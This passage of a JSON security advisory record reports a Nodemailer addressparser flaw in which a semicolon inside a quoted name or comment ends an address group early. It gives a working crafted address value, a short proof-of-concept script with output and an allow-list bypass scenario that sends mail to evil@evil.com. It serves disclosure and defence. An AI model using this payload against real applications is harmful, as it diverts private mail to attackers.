  "summary": "### Vulnerability summary",
  "details": "### Vulnerability summary\n\naddressparser ends an RFC 5322 group at the first `;`, including one inside a quoted display name or a comment. The text after it is parsed again as top level recipients with the quoting flipped, so text that every conformant parser reads as a display name or comment becomes a live address. `G: (a; <evil@evil.com>) <v@victim.com>;` names only `v@victim.com`, and Nodemailer read it as the single recipient `evil@evil.com`. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of an address field that an application passes to Nodemailer, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 group that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application validates the recipients of a submitted address list with a conformant parser and only allows addresses at its own domain. The attacker submits `G: (a; <evil@evil.com>) <v@victim.com>;`. The validator sees one mailbox, `v@victim.com`, and approves it. Nodemailer delivers to `evil@evil.com` only. The same works through a quoted display name, `G: \"a;\" \"<evil@evil.com>\" <v@victim.com>;`. The boundary crossed is the application's recipient allow list.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"G: (a; <evil@evil.com>) <v@victim.com>;\"));\n// [ { name: 'G', group: [ [Object] ] }, { address: 'evil@evil.com', name: ') v@victim.com' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as the single mailbox `v@victim.com`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"G: (a; <evil@evil.com>) <v@victim.com>;\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail that an application intends for an approved recipient goes to a recipient chosen by the attacker, which discloses its content, and the intended recipient never receives it. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed, which makes it a security issue rather than a parsing bug. Affected are applications that pass user influenced address lists to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix tracks quoted strings and comments inside a group and reads only a `;` outside them.\n\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
    }
